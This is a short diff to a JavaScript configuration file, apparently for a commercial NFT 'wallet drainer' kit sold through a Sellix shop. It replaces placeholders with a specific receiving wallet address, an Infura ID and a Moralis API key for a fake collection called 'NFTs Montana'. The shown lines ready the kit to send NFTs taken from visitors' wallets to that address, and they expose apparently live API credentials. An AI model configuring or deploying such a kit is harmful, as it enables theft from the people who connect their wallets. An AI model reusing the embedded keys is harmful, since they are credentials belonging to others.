@@ -3,9 +3,9 @@
     Shop: https://nftservices.sellix.io/
 */
 
-const address = "YOUR WALLET";    // Your wallet that you have to receive NFTs
-const infuraId = "API KEY"     // Infuria ID | https://infura.io/ | For Wallet Connect
-const moralisApi = "X-API-KEY"    // x-api-key | https://moralis.io/ | For NFTs
+const address = "0x9c579d311Fe775CCCaC860189d316E71bc8831df";    // Your wallet that you have to receive NFTs
+const infuraId = "55de9704d20e470b998ad509e9be3d1c"     // Infuria ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "v7OI203VQGTxVZbmzIU9mAtcn3KrOzX99BSZuwve0Jcbyrume9RD24hmn8W4k8mQ"    // x-api-key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
     name: "NFTs Montana",
